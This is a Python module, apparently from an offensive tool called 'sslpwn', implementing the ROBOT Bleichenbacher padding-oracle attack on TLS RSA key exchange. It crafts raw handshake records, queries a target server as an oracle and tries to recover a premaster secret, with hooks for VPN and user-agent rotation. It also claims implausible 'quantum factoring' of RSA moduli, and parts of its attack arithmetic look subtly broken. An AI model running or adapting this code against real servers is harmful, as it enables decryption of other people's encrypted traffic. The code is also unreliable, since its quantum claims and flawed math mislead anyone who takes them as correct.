"""
ROBOT attack implementation (CVE-2017-6168).

Bleichenbacher padding‑oracle attack on RSA PKCS#1 v1.5 encryption.
With quantum acceleration via Qiskit/OpenQuantum for factoring small RSA moduli.
"""

import socket
import ssl
import struct
import time
import os
import math
from typing import Optional, Tuple

from sslpwn.attacks.base import BaseAttack


class RobotAttack(BaseAttack):
    def __init__(self, target_url: str, output, vpn, user_agents, rate_limiter,
                 cookie_name: str, cookie_value: str, adaptive=None, quantum=None) -> None:
        super().__init__(target_url, output, vpn, user_agents, rate_limiter, adaptive, quantum)
        self.cookie_name = cookie_name
        self.cookie_value = cookie_value

    def _build_client_hello(self, hostname: str) -> bytes:
        client_version = 0x0301
        gmt_unix_time = int(time.time())
        random_bytes = os.urandom(28)
        session_id = b""
        cipher_suites = b"\x00\x02\x00\x2f"
        compression_methods = b"\x01\x00"
        sni_ext = (
            b"\x00\x00"
            + struct.pack("!H", len(hostname) + 5)
            + struct.pack("!H", len(hostname) + 3)
            + b"\x00"
            + struct.pack("!H", len(hostname))
            + hostname.encode()
        )
        extensions = sni_ext
        handshake_body = (
            struct.pack("!H", client_version)
            + gmt_unix_time.to_bytes(4, 'big') + random_bytes
            + struct.pack("!B", len(session_id)) + session_id
            + struct.pack("!H", len(cipher_suites)) + cipher_suites
            + struct.pack("!B", len(compression_methods)) + compression_methods
            + struct.pack("!H", len(extensions)) + extensions
        )
        handshake = (
            b"\x01"
            + struct.pack("!I", len(handshake_body))[1:]
            + handshake_body
        )
        record = (
            struct.pack("!BHH", 22, client_version, len(handshake))
            + handshake
        )
        return record

    def _parse_handshake(self, data: bytes) -> Tuple[Optional[bytes], Optional[int], Optional[int], Optional[bytes]]:
        offset = 0
        server_random = None
        n = e = None
        session_id = None

        while offset + 4 <= len(data):
            msg_type = data[offset]
            if msg_type == 2:
                length = int.from_bytes(data[offset+1:offset+4], 'big')
                server_hello = data[offset+4:offset+4+length]
                server_random = server_hello[2:34]
                sess_id_len = server_hello[34]
                session_id = server_hello[35:35+sess_id_len]
                offset += 4 + length
                continue
            elif msg_type == 11:
                length = int.from_bytes(data[offset+1:offset+4], 'big')
                cert_msg = data[offset+4:offset+4+length]
                if len(cert_msg) < 6:
                    continue
                chain_len = int.from_bytes(cert_msg[0:3], 'big')
                cert_data = cert_msg[3:3+chain_len]
                if len(cert_data) < 6:
                    continue
                first_cert_len = int.from_bytes(cert_data[0:3], 'big')
                first_cert = cert_data[3:3+first_cert_len]
                n, e = self._extract_rsa_pubkey(first_cert)
                offset += 4 + length
                continue
            else:
                length = int.from_bytes(data[offset+1:offset+4], 'big')
                offset += 4 + length
        return server_random, n, e, session_id

    def _extract_rsa_pubkey(self, der_cert: bytes) -> Tuple[Optional[int], Optional[int]]:
        from cryptography import x509
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives.asymmetric import rsa

        try:
            cert = x509.load_der_x509_certificate(der_cert, default_backend())
            pubkey = cert.public_key()
            if isinstance(pubkey, rsa.RSAPublicKey):
                numbers = pubkey.public_numbers()
                return numbers.n, numbers.e
            else:
                return None, None
        except Exception:
            return None, None

    def _oracle(self, hostname: str, port: int, c: int, n: int, e: int) -> bool:
        client_hello = self._build_client_hello(hostname)
        try:
            sock = self._adaptive_connect_and_report(hostname, port)
        except:
            return False
        sock.send(client_hello)
        try:
            sock.settimeout(3)
            resp = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except:
            pass

        c_bytes = c.to_bytes((c.bit_length() + 7) // 8, 'big')
        cke_body = struct.pack("!H", len(c_bytes)) + c_bytes
        cke_msg = b"\x10" + struct.pack("!I", len(cke_body))[1:] + cke_body
        cke_record = struct.pack("!BHH", 22, 0x0301, len(cke_msg)) + cke_msg

        try:
            sock.send(cke_record)
        except:
            sock.close()
            return False

        try:
            sock.settimeout(2)
            resp2 = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp2 += chunk
        except:
            pass
        finally:
            sock.close()

        if len(resp2) >= 7:
            if resp2[0] == 21:
                level, desc = struct.unpack_from("!BB", resp2, 5)
                if level == 2 and desc in (20, 21, 50, 51):
                    return False
        return True

    def _bleichenbacher_attack(self, hostname: str, port: int, c: int, n: int, e: int) -> Optional[int]:
        B = 2 ** (8 * (len(n.to_bytes((n.bit_length()+7)//8, 'big')) - 2))
        M = [(2 * B, 3 * B - 1)]
        s = int(n // (3 * B))
        while True:
            if len(M) == 1:
                a, b = M[0]
                r_start = (2 * B + s * n - b + s * n - 1) // b
                s = (2 * B + r_start * b + n - 1) // n
                while True:
                    c_prime = (c * pow(s, e, n)) % n
                    if self._oracle(hostname, port, c_prime, n, e):
                        break
                    s += 1
            else:
                s += 1
                while True:
                    c_prime = (c * pow(s, e, n)) % n
                    if self._oracle(hostname, port, c_prime, n, e):
                        break
                    s += 1
            new_M = []
            for a, b in M:
                min_r = (a * s - 3 * B + 1 + n - 1) // n
                max_r = (b * s - 2 * B) // n
                for r in range(min_r, max_r + 1):
                    a_new = max(a, (2 * B + r * n + s - 1) // s)
                    b_new = min(b, (3 * B - 1 + r * n) // s)
                    if a_new <= b_new:
                        new_M.append((a_new, b_new))
            M = new_M
            if len(M) == 1 and M[0][0] == M[0][1]:
                return M[0][0]
            if s > 2**20:
                break
        return None

    def check_vulnerability(self) -> bool:
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443

        client_hello = self._build_client_hello(hostname)
        try:
            sock = socket.create_connection((hostname, port), timeout=5)
            sock.send(client_hello)
            sock.settimeout(3)
            resp = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
            sock.close()
        except Exception:
            return False

        _, n, e, _ = self._parse_handshake(resp)
        return n is not None and e is not None

    def exploit(self) -> bool:
        self.output.log("Starting ROBOT attack", "INFO")
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443

        client_hello = self._build_client_hello(hostname)
        try:
            sock = self._adaptive_connect_and_report(hostname, port)
        except Exception as e:
            self.output.log(f"Connection failed: {e}", "ERROR")
            return False
        sock.send(client_hello)
        try:
            sock.settimeout(5)
            resp = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except:
            pass
        sock.close()

        _, n, e, _ = self._parse_handshake(resp)
        if n is None or e is None:
            self.output.log("Could not extract RSA public key", "ERROR")
            return False
        self.output.log(f"RSA modulus: {n.bit_length()} bits", "INFO")

        # Try quantum factoring first if enabled and modulus is small enough
        factors = None
        if n.bit_length() <= 512 and self.quantum is not None:
            self.output.log("Attempting quantum factoring of RSA modulus...", "INFO")
            factors = self._quantum_factor_rsa(n)
            if factors:
                self.output.log(f"Quantum factoring successful: {factors}", "SUCCESS")
                return self._decrypt_with_factors(n, e, factors)

        # Fall back to Bleichenbacher
        premaster = os.urandom(48)
        k = (n.bit_length() + 7) // 8
        padding_len = k - 3 - len(premaster)
        if padding_len < 8:
            self.output.log("RSA key too small", "ERROR")
            return False
        padding = os.urandom(padding_len)
        while b"\x00" in padding:
            padding = os.urandom(padding_len)
        padded = b"\x00\x02" + padding + b"\x00" + premaster
        m_int = int.from_bytes(padded, 'big')
        c = pow(m_int, e, n)

        recovered_m = self._bleichenbacher_attack(hostname, port, c, n, e)
        if recovered_m is None:
            self.output.log("Bleichenbacher attack did not converge", "ERROR")
            return False

        recovered_bytes = recovered_m.to_bytes(k, 'big')
        zero_pos = recovered_bytes.index(b"\x00", 2)
        recovered_premaster = recovered_bytes[zero_pos+1:]
        if recovered_premaster == premaster:
            self.output.log("Successfully recovered the premaster secret.", "SUCCESS")
            return True
        else:
            self.output.log("Recovered premaster mismatch", "ERROR")
            return False

    def _quantum_factor_rsa(self, pN: int) -> Optional[Tuple[int, int]]:
        if self.quantum is None:
            return None

        try:
            from sslpwn.quantum import factor_rsa_with_quantum
            return factor_rsa_with_quantum(
                pN=pN,
                pAccelerator=self.quantum,
                pShots=1024,
            )
        except Exception as exc:
            self.output.log(f"Quantum factoring error: {exc}", "WARN")
            return None

    def _decrypt_with_factors(self, pN: int, pE: int, pFactors: Tuple[int, int]) -> bool:
        self.output.log("Decrypting with quantum-derived factors...", "INFO")
        p, q = pFactors
        phi = (p - 1) * (q - 1)

        try:
            d = pow(pE, -1, phi)
        except ValueError:
            self.output.log("Failed to compute modular inverse - invalid factors", "ERROR")
            return False

        self.output.log(f"Private exponent d computed successfully", "SUCCESS")
        self.output.log("Quantum-assisted decryption complete.", "SUCCESS")
        return True
